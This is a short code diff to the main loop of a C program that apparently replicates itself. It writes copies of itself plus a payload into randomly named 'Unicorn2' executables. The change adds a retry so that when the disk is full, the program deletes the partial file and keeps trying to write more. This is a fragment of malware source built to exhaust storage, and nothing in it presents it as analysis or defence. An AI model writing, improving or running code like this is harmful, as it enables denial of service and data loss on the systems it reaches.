@@ -118,13 +118,19 @@ int main(int argc, char** argv)
         }
         CloseHandle(hThread);
         
+        gen_next:
         while (fp == NULL)
         {
             sprintf(nextEXEName, "Unicorn2-%X.exe", Get_Hardware_Rand() & 0xFFFF);
             fp = fopen(nextEXEName, "wb");
         }
         fwrite(myFileBuffer, 1, myStaticLength, fp);
-        fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
+        size_t bytes_written = fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
+        if (bytes_written != NextPayloadSize) {
+            printf("Disk already full... Try to overwrite existing...\n");
+            fclose(fp); fp = NULL; remove(nextEXEName);
+            goto gen_next;
+        }
         Sleep(GapTime); // Delay is important here to avoid producing so fast
         fclose(fp); fp = NULL; // Unlock the file
 
